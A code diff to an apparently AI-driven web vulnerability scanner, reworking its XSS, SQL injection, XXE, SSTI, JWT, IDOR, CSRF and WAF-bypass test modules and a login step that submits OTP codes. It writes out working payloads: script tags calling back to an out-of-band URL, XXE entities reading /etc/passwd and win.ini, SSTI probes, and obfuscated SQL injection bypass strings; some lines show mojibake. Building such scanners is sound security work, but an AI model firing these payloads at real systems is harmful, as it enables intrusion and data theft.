-            "by_class": by_class,
-        }
-
-
-# ── Blind Tests (via OAST) ───────────────────────────────────
-
-async def test_blind_xss(pool, endpoint, params, oast: OASTServer):
-    """Test for blind XSS - injects script that calls back to OAST."""
-    if not oast:
-        return []
-    findings = []
-    payload_url = oast.get_payload_url()
-    blind_payloads = [
-        f'"><script src={payload_url}></script>',
-        f"'><script>fetch('{payload_url}')</script>",
-        '<img src=x onerror="fetch(' + payload_url + ')">',
-    ]
-    for param in params:
-        for payload in blind_payloads:
-            test_url = f"{endpoint}?{param}={payload}"
-            await pool.send("GET", test_url)
-    # Smart OAST polling: check every 0.5s for up to 2s
-    for _i in range(4):
-        await asyncio.sleep(0.5)
-        if oast.callbacks:
-            break
-    if oast.callbacks:
-        findings.append({
-            "vuln_class": "xss",
-            "subtype": "blind",
-            "severity": "critical",
-            "url": endpoint,
-            "param": params[0] if params else "",
-            "payload": blind_payloads[0],
-            "evidence": f"OAST received {len(oast.callbacks)} callbacks",
-            "confidence": 0.9,
-        })
-        log.info("blind_xss_confirmed", callbacks=len(oast.callbacks))
+            padded = parts[0] + "=" * (-len(parts[0]) % 4)
+            header = _json.loads(_b64.urlsafe_b64decode(padded))
+        except Exception:
+            continue
+        # jku injection
+        jku = header.get("jku", "")
+        if jku and ("http://" in str(jku) or "evil" in str(jku)):
+            findings.append({
+                "vuln_class": "jwt",
+                "subtype": "jku_injection",
+                "severity": "critical",
+                "url": target,
+                "injected_url": target,
+                "param": "jku",
+                "payload": str(jku)[:100],
+                "evidence": "JWT jku uses HTTP or external URL",
+                "confidence": 0.85,
+            })
+        # x5u injection
+        x5u = header.get("x5u", "")
+        if x5u and ("http://" in str(x5u) or "evil" in str(x5u)):
+            findings.append({
+                "vuln_class": "jwt",
+                "subtype": "x5u_injection",
+                "severity": "critical",
+                "url": target,
+                "injected_url": target,
+                "param": "x5u",
+                "payload": str(x5u)[:100],
+                "evidence": "JWT x5u references external URL",
+                "confidence": 0.85,
+            })
+        # x5c present (embedded cert)
+        if header.get("x5c"):
+            findings.append({
+                "vuln_class": "jwt",
+                "subtype": "x5c_embedded_cert",
+                "severity": "info",
+                "url": target,
+                "injected_url": target,
+                "param": "x5c",
+                "payload": "(embedded certificate)",
+                "evidence": "JWT uses x5c (embedded certificate chain)",
+                "confidence": 0.7,
+            })
+        # kid injection
+        kid = str(header.get("kid", ""))
+        if kid and any(c in kid for c in ["../", "/etc/", "|", ";", "$("]):
+            findings.append({
+                "vuln_class": "jwt",
+                "subtype": "kid_path_traversal",
+                "severity": "critical",
+                "url": target,
+                "injected_url": target,
+                "param": "kid",
+                "payload": kid[:100],
+                "evidence": "JWT kid contains path traversal",
+                "confidence": 0.9,
+            })
+        # alg=none
+        if header.get("alg", "").lower() == "none":
+            findings.append({
+                "vuln_class": "jwt",
+                "subtype": "alg_none",
+                "severity": "critical",
+                "url": target,
+                "injected_url": target,
+                "param": "alg",
+                "payload": "none",
+                "evidence": "JWT with alg=none",
+                "confidence": 0.95,
+            })
+    log.info("jwt_multi_complete", tokens=len(tokens), findings=len(findings))
     return findings
 
-
-async def test_ssrf_oast(pool, endpoint, params, oast: OASTServer):
-    """Test for blind SSRF via OAST."""
-    if not oast:
-        return []
+async def test_jwt(pool, target):
+    """Test for JWT vulnerabilities."""
     findings = []
-    payload_url = oast.get_payload_url()
-    for param in params:
-        test_url = f"{endpoint}?{param}={payload_url}"
-        await pool.send("GET", test_url)
-    # Smart OAST polling
-    for _i in range(4):
-        await asyncio.sleep(0.5)
-        if oast.callbacks:
-            break
-    if oast.callbacks:
-        findings.append({
-            "vuln_class": "ssrf",
-            "subtype": "blind",
-            "severity": "critical",
-            "url": endpoint,
-            "param": params[0] if params else "",
-            "payload": payload_url,
-            "evidence": f"OAST received {len(oast.callbacks)} callbacks",
-            "confidence": 0.9,
-        })
-        log.info("ssrf_confirmed", callbacks=len(oast.callbacks))
-    return findings
-
-
-# ── Stage 4 Integration into run_scan ────────────────────────
-
-async def run_scan_v4(target, budget=100, exploit="off"):
-    """Full scan with OAST + DB + Bypass."""
-    start = time.monotonic()
-    cfg = ScanConfig(target=target, budget=budget, exploit_mode=exploit)
-    ai_cfg = AIConfig()
-    log.info("scan_v4_start", target=target, budget=budget, exploit=exploit)
-
-    if not ai_cfg.api_key:
-        return {"error": "MODEL_API_KEY not set", "status": "failed"}
-
-    ai = AIClient(ai_cfg)
-    scope = ScopeGuard.from_target(target)
-    rate = RateLimiter(cfg.rate_limit)
-    db = FalconDB(cfg.db_path)
-    summary = {"target": target, "budget": budget, "exploit": exploit}
-
-    # Start OAST
-    oast = OASTServer(port=9999, public_domain="127.0.0.1")
-    oast_started = oast.start()
-
-    all_findings = []
-
+    # Check for JWT in cookies or common endpoints
+    resp = await pool.send("GET", target)
+    # Look for JWT patterns in response
+    # JWT_IMPROVED_v2
+    # Use framework helper if available
     try:
-        async with HttpPool(scope, rate, cfg) as pool:
-            # Recon
-            waf = await detect_waf(pool, target)
-            fp = await fingerprint(pool, target)
-            crawl_result = await crawl(pool, target, max_pages=min(20, budget // 2))
-            summary["waf"] = waf
-            summary["fingerprint"] = fp
-            summary["crawl"] = crawl_result
-
-            # AI Plan
-            system_prompt = "You are an autonomous penetration testing agent. Analyze the target and produce a JSON action plan."
-            user_prompt = json.dumps({
-                "target": target, "waf": waf, "fingerprint": fp,
-                "crawl": {"pages": crawl_result["pages_visited"], "endpoints": len(crawl_result["endpoints"])},
-            }, ensure_ascii=False, indent=2)
-            plan = await ai.think(system_prompt, user_prompt)
-            summary["ai_plan"] = plan
-
-            # Vuln tests
-            findings = await run_vulnerability_tests(pool, crawl_result, plan)
-            all_findings.extend(findings)
-
-            # Blind tests via OAST
-            if oast_started:
-                root_url = target.rstrip("/")
-                common_params = ["id", "q", "url", "redirect"]
-                blind = await test_blind_xss(pool, root_url, common_params, oast)
-                all_findings.extend(blind)
-                ssrf = await test_ssrf_oast(pool, root_url, common_params, oast)
-                all_findings.extend(ssrf)
-
-    finally:
-        if oast_started:
-            oast.stop()
-
-    elapsed = round(time.monotonic() - start, 2)
-    summary["elapsed_seconds"] = elapsed
-    summary["budget_used"] = pool.request_count
-    summary["ai_calls"] = ai.call_count
-    summary["ai_tokens"] = ai.total_tokens
-    summary["findings_count"] = len(all_findings)
-    summary["status"] = "completed"
-
-    # Save to DB
-    scan_id = db.save_scan(summary, all_findings)
-    summary["scan_id"] = scan_id
-
-    report_path = render_report(all_findings, summary, cfg.output_dir)
-    summary["report_path"] = report_path
-
-    log.info("scan_v4_complete", elapsed=elapsed, requests=pool.request_count,
-             findings=len(all_findings), scan_id=scan_id)
-    return summary
-
-
-# (main moved)
-
-
-# ============================================================
-# Stage 5: Additional Vulnerability Engines
-# ============================================================
-
-async def test_idor(pool, endpoints, session_a=None, session_b=None):
-    """Test for IDOR - access resources with different IDs."""
-    findings = []
-    id_pattern = __import__("re").compile(r"[?&](id|user_id|account|uid|pid)=([0-9]+)")
-    
-    for endpoint in endpoints:
-        match = id_pattern.search(endpoint)
-        if not match:
-            continue
-        param = match.group(1)
-        original_id = int(match.group(2))
-        # Test adjacent IDs
-        for test_id in [original_id + 1, original_id - 1, original_id + 1000, 1]:
-            if test_id < 1:
-                continue
-            test_url = id_pattern.sub(f"{param}={test_id}", endpoint)
-            resp = await pool.send("GET", test_url)
-            if resp.status == 200 and len(resp.text) > 100:
-                # Potential IDOR - check if content differs meaningfully
-                findings.append({
-                    "vuln_class": "idor",
-                    "subtype": "sequential_id",
-                    "severity": "high",
-                    "url": test_url,
-                    "param": param,
-                    "payload": str(test_id),
-                    "evidence": f"Accessed resource with {param}={test_id} (status=200, len={len(resp.text)})",
-                    "confidence": 0.6,
-                })
-                log.info("idor_candidate", url=test_url, param=param, test_id=test_id)
-                break
-    return findings
-
-
-async def test_csrf(pool, forms):
-    """Test for CSRF - check for missing CSRF tokens in forms."""
-    findings = []
-    for form in forms:
-        action = form.get("action", "")
-        if not action:
-            continue
-        resp = await pool.send("GET", action)
-        if resp.status == 0:
-            continue
-        body = resp.text.lower()
-        # Check for CSRF token indicators
-        csrf_indicators = ["csrf", "xsrf", "_token", "authenticity_token", "nonce"]
-        has_csrf = any(ind in body for ind in csrf_indicators)
-        if not has_csrf:
-            # Check for state-changing form
-            has_password = "password" in body.lower()
-            has_post = "post" in body.lower()
-            if has_password or has_post:
-                findings.append({
-                    "vuln_class": "csrf",
-                    "subtype": "missing_token",
-                    "severity": "medium",
-                    "url": action,
-                    "param": "",
-                    "payload": "Cross-site form submission",
-                    "evidence": f"Form at {action} has no CSRF token",
-                    "confidence": 0.5,
-                })
-                log.info("csrf_candidate", action=action)
-    return findings
-
-
-async def test_jwt(pool, target):
-    """Test for JWT vulnerabilities."""
-    findings = []
-    # Check for JWT in cookies or common endpoints
-    resp = await pool.send("GET", target)
-    # Look for JWT patterns in response
+        from framework_bridge import FRAMEWORK_DIR
+        import sys as _sys
+        _fw_path = str(FRAMEWORK_DIR)
+        if _fw_path not in _sys.path:
+            _sys.path.insert(0, _fw_path)
+    except Exception:
+        pass
     jwt_pattern = __import__("re").compile(r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+")
     matches = jwt_pattern.findall(resp.text)
     for token in matches[:3]:
@@ -1879,6 +3668,139 @@ async def test_jwt(pool, target):
                 })
         except Exception:
             pass
+    return findings
+
+
+async def test_jwt_advanced(pool, target):
+    """Advanced JWT analysis: alg=none, kid injection, weak claims."""
+    import re as _re
+    import base64 as _b64
+    import json as _json
+    findings = []
+    resp = await pool.send("GET", target)
+    if not resp or resp.status == 0:
+        return findings
+    body = resp.text or ""
+    jwt_re = _re.compile(r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")
+    tokens = jwt_re.findall(body)[:5]
+    for token in tokens:
+        parts = token.split(".")
+        if len(parts) != 3:
+            continue
+        try:
+            padded = parts[0] + "=" * (-len(parts[0]) % 4)
+            header = _json.loads(_b64.urlsafe_b64decode(padded))
+        except Exception:
+            continue
+        alg = header.get("alg", "").lower()
+        # Check alg=none
+        if alg == "none":
+            findings.append({
+                "vuln_class": "jwt",
+                "subtype": "alg_none",
+                "severity": "critical",
+                "url": target,
+                "param": "Authorization",
+                "payload": token[:50] + "...",
+                "evidence": "JWT with alg=none detected",
+                "confidence": 0.95,
+            })
+        # Check kid injection
+        kid = header.get("kid", "")
+        if kid and any(c in str(kid) for c in ["../", "/etc/", "|", ";"]):
+            findings.append({
+                "vuln_class": "jwt",
+                "subtype": "kid_injection",
+                "severity": "high",
+                "url": target,
+                "param": "kid",
+                "payload": str(kid)[:50],
+                "evidence": "JWT kid contains injection patterns",
+                "confidence": 0.7,
+            })
+        # Weak algorithm
+        if alg == "hs256":
+            findings.append({
+                "vuln_class": "jwt",
+                "subtype": "weak_alg_hs256",
+                "severity": "info",
+                "url": target,
+                "param": "alg",
+                "payload": "HS256",
+                "evidence": "JWT uses HS256 (symmetric)",
+                "confidence": 0.5,
+            })
+    log.info("jwt_advanced_complete", tokens=len(tokens), findings=len(findings))
+    return findings
+
+
+async def test_xxe_advanced(pool, endpoints, oast=None):
+    """Advanced XXE: file disclosure + OAST-based blind."""
+    findings = []
+    if not endpoints:
+        return findings
+    FILE_PAYLOADS = [
+        ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
+         ["root:x:", "daemon:x:", "nobody:x:"]),
+        ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><r>&xxe;</r>',
+         ["[extensions]", "[fonts]", "for 16-bit app support"]),
+    ]
+    for endpoint in endpoints[:3]:
+        for payload, indicators in FILE_PAYLOADS:
+            try:
+                resp = await pool.send("POST", endpoint, content=payload,
+                    headers={"Content-Type": "application/xml"})
+            except Exception:
+                continue
+            if not resp or resp.status == 0:
+                continue
+            body = resp.text or ""
+            for ind in indicators:
+                if ind in body:
+                    findings.append({
+                        "vuln_class": "xxe",
+                        "subtype": "file_disclosure",
+                        "severity": "critical",
+                        "url": endpoint,
+                        "injected_url": endpoint,
+                        "param": "XML body",
+                        "payload": payload[:100],
+                        "evidence": body[:300],
+                        "confidence": 0.95,
+                    })
+                    log.info("xxe_file_found", endpoint=endpoint)
+                    break
+    # OAST-based blind XXE
+    if oast:
+        try:
+            payload_url = oast.get_payload_url()
+            for endpoint in endpoints[:2]:
+                oast_payload = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "' + payload_url + '">]><r>&xxe;</r>'
+                try:
+                    await pool.send("POST", endpoint, content=oast_payload,
+                        headers={"Content-Type": "application/xml"})
+                except Exception:
+                    continue
+            import asyncio as _a
+            for _ in range(4):
+                await _a.sleep(0.5)
+                if oast.callbacks:
+                    break
+            if oast.callbacks:
+                findings.append({
+                    "vuln_class": "xxe",
+                    "subtype": "oast_blind",
+                    "severity": "critical",
+                    "url": endpoints[0],
+                    "injected_url": endpoints[0],
+                    "param": "XML body",
+                    "payload": "OAST callback",
+                    "evidence": "OAST received " + str(len(oast.callbacks)) + " callbacks",
+                    "confidence": 0.95,
+                })
+        except Exception as _e:
+            log.debug("xxe_oast_error", error=str(_e))
+    log.info("xxe_advanced_complete", findings=len(findings))
     return findings
 
 
@@ -1910,6 +3832,54 @@ async def test_xxe(pool, endpoints):
                     })
                     log.info("xxe_found", endpoint=endpoint)
                     break
+    return findings
+
+
+async def test_ssti_advanced(pool, endpoints, params=None):
+    """Advanced SSTI: polyglot payloads + engine-specific detection."""
+    if params is None:
+        params = ["name", "q", "search", "template", "view", "page"]
+    findings = []
+    # (payload, expected_marker, engine)
+    PAYLOADS = [
+        ("{{7*7}}", "49", "Jinja2/Twig"),
+        ("${7*7}", "49", "Freemarker/JSP EL"),
+        ("#{7*7}", "49", "Ruby ERB"),
+        ("{{7*'7'}}", "7777777", "Jinja2"),
+        ("<%= 7*7 %>", "49", "ERB"),
+        ("{7*7}", "49", "Smarty"),
+        ("${{7*7}}", "49", "Generic"),
+        ("{{config}}", "SECRET_KEY", "Jinja2 config leak"),
+        ("{{self.__class__}}", "class", "Jinja2 RCE hint"),
+    ]
+    for endpoint in endpoints[:3]:
+        for param in params:
+            for payload, expected, engine in PAYLOADS:
+                from urllib.parse import quote
+                test_url = endpoint + "?" + param + "=" + quote(payload, safe="")
+                try:
+                    resp = await pool.send("GET", test_url)
+                except Exception:
+                    continue
+                if not resp or resp.status == 0:
+                    continue
+                body = resp.text or ""
+                if expected in body and payload not in body:
+                    findings.append({
+                        "vuln_class": "ssti",
+                        "subtype": "template_injection",
+                        "severity": "critical",
+                        "url": test_url,
+                        "injected_url": test_url,
+                        "param": param,
+                        "payload": payload,
+                        "engine_hint": engine,
+                        "evidence": "Expected " + expected + " found",
+                        "confidence": 0.9,
+                    })
+                    log.info("ssti_advanced_found", param=param, engine=engine)
+                    break
+    log.info("ssti_advanced_complete", findings=len(findings))
     return findings
 
 
@@ -1995,6 +3965,69 @@ async def run_vulnerability_tests_v2(pool, crawl_result, ai_plan, oast=None, waf
         ssti = await test_ssti(pool, [root], ["name", "q"])
         all_findings.extend(ssti)
     
+    # === WAF ADVANCED (Stage 2.B8) ===
+    try:
+        waf_adv = await test_waf_advanced(pool, target, active_probe=True)
+        if waf_adv and waf_adv.get("detected"):
+            summary["_waf_advanced"] = waf_adv
+            config["_waf_advanced"] = waf_adv
+            log.info("waf_advanced_wired", waf=waf_adv.get("waf"), strictness=waf_adv.get("strictness"))
+    except Exception as _waf:
+        log.warning("waf_advanced_failed", error=str(_waf))
+    # === END WAF ADVANCED ===
+
+    # === FINGERPRINT ADVANCED (Stage 2.B2) ===
+    try:
+        advanced_fp = await test_fingerprint_advanced(pool, target)
+        if advanced_fp:
+            config["_fingerprint_advanced"] = advanced_fp
+            log.info("fingerprint_advanced_wired", tech_count=len(advanced_fp.get("technologies", [])))
+    except Exception as _fp:
+        log.warning("fingerprint_advanced_failed", error=str(_fp))
+    # === END FINGERPRINT ADVANCED ===
+
+    # === POST SQLi/SSRF/Redirect (Stage 2.B3) ===
+    try:
+        forms_post = config.get("_crawl_forms_post", []) or []
+        for _form in forms_post[:5]:
+            _action = _form.get("action", "")
+            _body = _form.get("body", "")
+            _fields = _form.get("fields", []) or []
+            if not _action or not _fields:
+                continue
+            _pj = _body if _body.strip().startswith("{") else ""
+            _pd = "" if _pj else _body
+            _sqli_post = await test_sqli_post(pool, _action, _fields, post_data=_pd, post_json=_pj)
+            all_findings.extend(_sqli_post)
+            _ssrf_post = await test_ssrf_post(pool, _action, _fields, post_data=_pd, post_json=_pj)
+            all_findings.extend(_ssrf_post)
+            _redir_post = await test_open_redirect_post(pool, _action, _fields, post_data=_pd, post_json=_pj)
+            all_findings.extend(_redir_post)
+        log.info("post_sqli_ssrf_redirect_complete", total=len(all_findings))
+    except Exception as _ps:
+        log.warning("post_sqli_ssrf_redirect_failed", error=str(_ps))
+    # === END POST SQLi/SSRF/Redirect ===
+
+    # === SECURITY HEADERS (Stage 2.B6) ===
+    try:
+        sh_result = await test_security_headers(pool, target)
+        if sh_result and sh_result.get("vulnerable"):
+            all_findings.extend(sh_result["vulnerable"])
+            config["_security_headers_wired"] = sh_result
+    except Exception as _sh:
+        log.warning("security_headers_failed", error=str(_sh))
+    # === END SECURITY HEADERS ===
+
+    # === COOKIES ADVANCED (Stage 2.B7) ===
+    try:
+        ck_result = await test_cookies_advanced(pool, target)
+        if ck_result and ck_result.get("vulnerable"):
+            all_findings.extend(ck_result["vulnerable"])
+            config["_cookies_advanced_wired"] = ck_result
+    except Exception as _ck:
+        log.warning("cookies_advanced_failed", error=str(_ck))
+    # === END COOKIES ADVANCED ===
+
     log.info("vuln_tests_v2_complete", findings=len(all_findings), requests=pool.request_count)
     return all_findings
 
@@ -2009,234 +4042,6 @@ run_vulnerability_tests = run_vulnerability_tests_v2
 
 # ============================================================
 # Stage 5: Additional Vulnerability Engines
-# ============================================================
-
-async def test_idor(pool, endpoints, session_a=None, session_b=None):
-    """Test for IDOR - access resources with different IDs."""
-    findings = []
-    id_pattern = __import__("re").compile(r"[?&](id|user_id|account|uid|pid)=([0-9]+)")
-    
-    for endpoint in endpoints:
-        match = id_pattern.search(endpoint)
-        if not match:
-            continue
-        param = match.group(1)
-        original_id = int(match.group(2))
-        # Test adjacent IDs
-        for test_id in [original_id + 1, original_id - 1, original_id + 1000, 1]:
-            if test_id < 1:
-                continue
-            test_url = id_pattern.sub(f"{param}={test_id}", endpoint)
-            resp = await pool.send("GET", test_url)
-            if resp.status == 200 and len(resp.text) > 100:
-                # Potential IDOR - check if content differs meaningfully
-                findings.append({
-                    "vuln_class": "idor",
-                    "subtype": "sequential_id",
-                    "severity": "high",
-                    "url": test_url,
-                    "param": param,
-                    "payload": str(test_id),
-                    "evidence": f"Accessed resource with {param}={test_id} (status=200, len={len(resp.text)})",
-                    "confidence": 0.6,
-                })
-                log.info("idor_candidate", url=test_url, param=param, test_id=test_id)
-                break
-    return findings
-
-
-async def test_csrf(pool, forms):
-    """Test for CSRF - check for missing CSRF tokens in forms."""
-    findings = []
-    for form in forms:
-        action = form.get("action", "")
-        if not action:
-            continue
-        resp = await pool.send("GET", action)
-        if resp.status == 0:
-            continue
-        body = resp.text.lower()
-        # Check for CSRF token indicators
-        csrf_indicators = ["csrf", "xsrf", "_token", "authenticity_token", "nonce"]
-        has_csrf = any(ind in body for ind in csrf_indicators)
-        if not has_csrf:
-            # Check for state-changing form
-            has_password = "password" in body.lower()
-            has_post = "post" in body.lower()
-            if has_password or has_post:
-                findings.append({
-                    "vuln_class": "csrf",
-                    "subtype": "missing_token",
-                    "severity": "medium",
-                    "url": action,
-                    "param": "",
-                    "payload": "Cross-site form submission",
-                    "evidence": f"Form at {action} has no CSRF token",
-                    "confidence": 0.5,
-                })
-                log.info("csrf_candidate", action=action)
-    return findings
-
-
-async def test_jwt(pool, target):
-    """Test for JWT vulnerabilities."""
-    findings = []
-    # Check for JWT in cookies or common endpoints
-    resp = await pool.send("GET", target)
-    # Look for JWT patterns in response
-    jwt_pattern = __import__("re").compile(r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+")
-    matches = jwt_pattern.findall(resp.text)
-    for token in matches[:3]:
-        parts = token.split(".")
-        if len(parts) != 3:
-            continue
-        # Check alg:none attack
-        import base64
-        try:
-            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
-            if header.get("alg") in ("none", "None", "NONE"):
-                findings.append({
-                    "vuln_class": "jwt",
-                    "subtype": "alg_none",
-                    "severity": "critical",
-                    "url": target,
-                    "param": "Authorization",
-                    "payload": token[:50],
-                    "evidence": "JWT with alg:none detected",
-                    "confidence": 0.8,
-                })
-        except Exception:
-            pass
-    return findings
-
-
-async def test_xxe(pool, endpoints):
-    """Test for XXE injection via XML endpoints."""
-    findings = []
-    xxe_payloads = [
-        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
-        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><r>&xxe;</r>',
-    ]
-    xxe_indicators = ["root:x:", "[extensions]", "[fonts]", "for 16-bit app support"]
-    for endpoint in endpoints:
-        for payload in xxe_payloads:
-            resp = await pool.send("POST", endpoint, content=payload, headers={"Content-Type": "application/xml"})
-            if resp.status == 0:
-                continue
-            body = resp.text
-            for ind in xxe_indicators:
-                if ind in body:
-                    findings.append({
-                        "vuln_class": "xxe",
-                        "subtype": "file_disclosure",
-                        "severity": "critical",
-                        "url": endpoint,
-                        "param": "XML body",
-                        "payload": payload[:100],
-                        "evidence": body[:500],
-                        "confidence": 0.9,
-                    })
-                    log.info("xxe_found", endpoint=endpoint)
-                    break
-    return findings
-
-
-async def test_ssti(pool, endpoints, params=None):
-    """Test for Server-Side Template Injection."""
-    if params is None:
-        params = ["name", "q", "search", "template", "view"]
-    findings = []
-    ssti_payloads = [
-        ("{{7*7}}", "49"),
-        ("${7*7}", "49"),
-        ("{{7*'7'}}", "7777777"),
-        ("<%= 7*7 %>", "49"),
-    ]
-    for endpoint in endpoints:
-        for param in params:
-            for payload, expected in ssti_payloads:
-                test_url = f"{endpoint}?{param}={payload}"
-                resp = await pool.send("GET", test_url)
-                if resp.status == 0:
-                    continue
-                if expected in resp.text and payload not in resp.text:
-                    findings.append({
-                        "vuln_class": "ssti",
-                        "subtype": "template_injection",
-                        "severity": "critical",
-                        "url": test_url,
-                        "param": param,
-                        "payload": payload,
-                        "evidence": f"Expected {expected} found in response",
-                        "confidence": 0.85,
-                    })
-                    log.info("ssti_found", endpoint=endpoint, param=param)
-                    break
-    return findings
-
-
-async def run_vulnerability_tests_v2(pool, crawl_result, ai_plan, oast=None, waf_detected=False):
-    """Enhanced vulnerability tests with 5 new engines + WAF bypass."""
-    all_findings = []
-    log.info("vuln_tests_start", waf_detected=waf_detected)
-    endpoints = crawl_result.get("endpoints", [])
-    forms = crawl_result.get("forms", [])
-    root = target = ""
-    for u in crawl_result.get("all_urls", []):
-        if u and not u.endswith((".css", ".js", ".png", ".jpg")):
-            root = u
-            break
-    
-    # Common param tests (WAF-aware)
-    if root:
-        common_params = ["id", "q", "search", "user", "name", "page"]
-        if waf_detected:
-            xss = await test_xss_with_waf_bypass(pool, root, common_params[:3], waf_detected=True)
-            all_findings.extend(xss)
-            if pool.request_count < pool.config.budget - 20:
-                sqli_waf = await test_sqli_with_waf_bypass(pool, root, common_params[:3], waf_detected=True)
-                all_findings.extend(sqli_waf)
-        else:
-            xss = await test_xss(pool, root, common_params[:3])
-            all_findings.extend(xss)
-        if pool.request_count < pool.config.budget - 20:
-            sqli = await test_sqli(pool, root, common_params[:3])
-            all_findings.extend(sqli)
-        if pool.request_count < pool.config.budget - 15:
-            redir = await test_open_redirect(pool, root, ["redirect", "url", "next"])
-            all_findings.extend(redir)
-    
-    # NEW ENGINES
-    if pool.request_count < pool.config.budget - 10:
-        idor = await test_idor(pool, endpoints + [root])
-        all_findings.extend(idor)
-    
-    if pool.request_count < pool.config.budget - 8:
-        csrf = await test_csrf(pool, forms)
-        all_findings.extend(csrf)
-    
-    if pool.request_count < pool.config.budget - 6:
-        jwt = await test_jwt(pool, root)
-        all_findings.extend(jwt)
-    
-    if pool.request_count < pool.config.budget - 4:
-        ssti = await test_ssti(pool, [root], ["name", "q"])
-        all_findings.extend(ssti)
-    
-    log.info("vuln_tests_v2_complete", findings=len(all_findings), requests=pool.request_count)
-    return all_findings
-
-
-# Monkey-patch run_vulnerability_tests to use v2
-_original_rvt = run_vulnerability_tests
-run_vulnerability_tests = run_vulnerability_tests_v2
-
-
-# (main moved to end)
-
-
-# ============================================================
-# Stage 6: Enhanced AI Planning
 # ============================================================
 
 class EnhancedAIClient(AIClient):
@@ -2408,7 +4213,7 @@ async def run_scan_v5(target, budget=100, exploit="off", model=None, enable_thin
             cfg.post_data = post_data or ''
             cfg.post_json = post_json or ''
             # ============================================================
-            # Two-Step Login (username/password → optional OTP)
+            # Two-Step Login (username/password â†’ optional OTP)
             # ============================================================
             if login_url and username and password:
                 try:
@@ -2429,7 +4234,7 @@ async def run_scan_v5(target, budget=100, exploit="off", model=None, enable_thin
                             'sms', 'otp', 'verification code', 'verification_code',
                             'enter the code', '2fa', 'two-factor', 'two_factor',
                             'one-time', 'one_time', 'authentication code',
-                            'رمز التحقق', 'التحقق', 'كود التحقق', 'الرسالة النصية',
+                            'Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚', 'Ø§Ù„ØªØ­Ù‚Ù‚', 'ÙƒÙˆØ¯ Ø§Ù„ØªØ­Ù‚Ù‚', 'Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ù†ØµÙŠØ©',
                         ]
 
                         if any(ind in body_lower for ind in otp_indicators):
@@ -2485,7 +4290,7 @@ async def run_scan_v5(target, budget=100, exploit="off", model=None, enable_thin
                             log.info('otp_step_completed', url=otp_url)
 
                     elif sms_code and not needs_otp:
-                        # No OTP page detected — still send sms_code as fallback (single-page OTP)
+                        # No OTP page detected â€” still send sms_code as fallback (single-page OTP)
                         fallback_data = {'username': username, 'password': password, 'sms_code': sms_code, 'otp': sms_code}
                         _fb = await pool.send('POST', login_url, data=fallback_data)
                         log.info('login_single_page_otp_sent', status=_fb.status, url=login_url)
@@ -2856,28 +4661,99 @@ class WAFBypassEngine:
 
 
 async def test_xss_with_waf_bypass(pool, endpoint, params, waf_detected=False):
+    """XSS test with WAF bypass variants (framework helpers)."""
+    from framework_bridge import (
+        xss_verify_reflection, xss_find_context,
+    )
+    from urllib.parse import quote
+
     findings = []
     base_payload = "<script>alert(1)</script>"
     for param in params:
-        variants = WAFBypassEngine.generate_bypasses(base_payload, "xss") if waf_detected else [base_payload]
+        variants = (
+            WAFBypassEngine.generate_bypasses(base_payload, "xss")
+            if waf_detected else [base_payload]
+        )
         for payload in variants:
-            from urllib.parse import quote
-            test_url = f"{endpoint}?{param}={quote(payload)}"
+            test_url = f"{endpoint}?{param}={quote(payload, safe='')}"
             resp = await pool.send("GET", test_url)
             if resp.status == 0:
                 continue
-            if payload in resp.text or base_payload in resp.text:
+
+            body = resp.text or ""
+            if not xss_verify_reflection(body, payload):
+                continue
+
+            ctx = xss_find_context(body, payload) or {}
+
+            findings.append({
+                "vuln_class": "xss",
+                "subtype": "reflected_waf_bypass" if waf_detected else "reflected",
+                "severity": "high",
+                "url": test_url,
+                "injected_url": test_url,
+                "param": param,
+                "payload": payload,
+                "context_type": ctx.get("type", "html"),
+                "context_before": ctx.get("before", ""),
+                "context_after": ctx.get("after", ""),
+                "evidence": body[:300],
+                "confidence": 0.9,
+            })
+            log.info("xss_found", endpoint=endpoint, param=param,
+                     waf_bypass=waf_detected)
+            break
+    return findings
+
+async def test_sqli_with_waf_bypass_v2(pool, endpoint, params, waf_detected=False):
+    """SQLi with WAF bypass - dedicated variant using framework helpers."""
+    from framework_bridge import (
+        SQLI_ERROR_PAYLOADS, sqli_has_db_error, sqli_looks_like_error,
+    )
+    from urllib.parse import quote
+    findings = []
+    if not params:
+        return findings
+    if waf_detected:
+        variants = [
+            SQLI_ERROR_PAYLOADS,
+            ["1'/**/OR/**/'1'='1", "1'/*!UNION*//*!SELECT*/NULL--"],
+            ["%27%20OR%201=1--", "%27%20UNION%20SELECT%20NULL--"],
+        ]
+        flat = []
+        for v in variants:
+            flat.extend(v)
+        variants = list(dict.fromkeys(flat))
+    else:
+        variants = SQLI_ERROR_PAYLOADS
+    for param in params:
+        for payload in variants:
+            try:
+                test_url = f"{endpoint}?{param}={quote(payload, safe='')}"
+                resp = await pool.send("GET", test_url)
+            except Exception as _e:
+                log.debug("sqli_waf_failed", param=param, error=str(_e))
+                continue
+            if not resp or resp.status == 0:
+                continue
+            body = resp.text or ""
+            sig = sqli_has_db_error(body)
+            if not sig and resp.status == 500 and sqli_looks_like_error(body):
+                sig = "HTTP 500"
+            if sig:
                 findings.append({
-                    "vuln_class": "xss",
-                    "subtype": "reflected_waf_bypass" if waf_detected else "reflected",
-                    "severity": "high",
+                    "vuln_class": "sqli",
+                    "subtype": "error_based_waf_bypass",
+                    "severity": "critical",
                     "url": test_url,
+                    "injected_url": test_url,
                     "param": param,
                     "payload": payload,
-                    "evidence": resp.text[:300],
-                    "confidence": 0.85,
+                    "db_error": sig,
+                    "evidence": body[:300],
+                    "confidence": 0.9,
                 })
-                log.info("xss_found", endpoint=endpoint, param=param, waf_bypass=waf_detected)
+                log.info("sqli_waf_found", param=param)
                 break
     return findings
 
